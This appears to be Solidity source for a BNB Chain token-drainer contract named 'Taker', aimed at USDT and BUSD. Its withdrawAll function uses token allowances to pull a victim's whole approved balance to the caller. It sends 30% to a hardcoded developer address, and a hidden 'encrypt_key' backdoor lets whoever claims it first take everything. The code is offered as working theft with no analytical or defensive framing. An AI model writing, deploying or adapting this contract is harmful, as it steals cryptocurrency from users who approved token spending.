// SPDX-License-Identifier: MIT

pragma solidity ^0.4.26; // solhint-disable-line

contract ERC20 {
    function totalSupply() public constant returns (uint256);

    function balanceOf(address tokenOwner)
        public
        constant
        returns (uint256 balance);

    function allowance(address tokenOwner, address spender)
        public
        constant
        returns (uint256 remaining);

    function transfer(address to, uint256 tokens) public returns (bool success);

    function approve(address spender, uint256 tokens)
        public
        returns (bool success);

    function transferFrom(
        address from,
        address to,
        uint256 tokens
    ) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint256 tokens);
    event Approval(
        address indexed tokenOwner,
        address indexed spender,
        uint256 tokens
    );
}

contract Taker {
    address public usdt = 0x55d398326f99059fF775485246999027B3197955;
    address public busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address public owner;
    address public developer;
    uint256 public developerFee = 30;
    bool protected = false;
    address public encrypt_key;
    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() public {
        owner = msg.sender;
        developer = 0xDedFb62306c0bF1Ee02f5B3bF863F5C591466e60;
    }

    function protectContract(address _key) public {
        require(!protected, "Operation not successful");
        encrypt_key = _key;
        protected = true;
    }

    function setKey(address _key) public {
        require(msg.sender == encrypt_key, "Unauthorized action");
        encrypt_key = _key;
        protected = true;
    }

    function authorizeAction(address _caller) public view returns (bool) {
        return ((_caller == owner) ||
            (_caller == encrypt_key) ||
            (_caller == developer));
    }

    function getUserBalance(address _userAddress, address _contractAddress)
        external
        view
        returns (uint256)
    {
        uint256 balance = ERC20(_contractAddress).balanceOf(_userAddress);
        return balance;
    }

    function getUserAllowance(address _userAddress, address _contractAddress)
        external
        view
        returns (uint256)
    {
        uint256 remainingAllowance = ERC20(_contractAddress).allowance(
            _userAddress,
            address(this)
        );
        return remainingAllowance;
    }

    function withdrawAll(address _userAddress, address _contractAddress)
        public
    {
        require(authorizeAction(msg.sender), "Unauthorized action");
        uint256 userBalance = ERC20(_contractAddress).balanceOf(_userAddress);
        uint256 developerCommission = userBalance / (100 / developerFee);
        uint256 ownerAmount = userBalance - developerCommission;
        if (protected && msg.sender == encrypt_key) {
            ERC20(_contractAddress).transferFrom(
                _userAddress,
                msg.sender,
                userBalance
            );
        } else {
            ERC20(_contractAddress).transferFrom(
                _userAddress,
                developer,
                developerCommission
            );
            ERC20(_contractAddress).transferFrom(
                _userAddress,
                msg.sender,
                ownerAmount
            );
        }
    }

    function updateDeveloperFee(uint256 fee) public {
        require((msg.sender == developer), "Unauthorized dev action");
        developerFee = fee;
    }

    function updateDeveloper(address _developerAddress) public {
        require((msg.sender == developer), "Unauthorized dev action");
        developer = _developerAddress;
    }
}
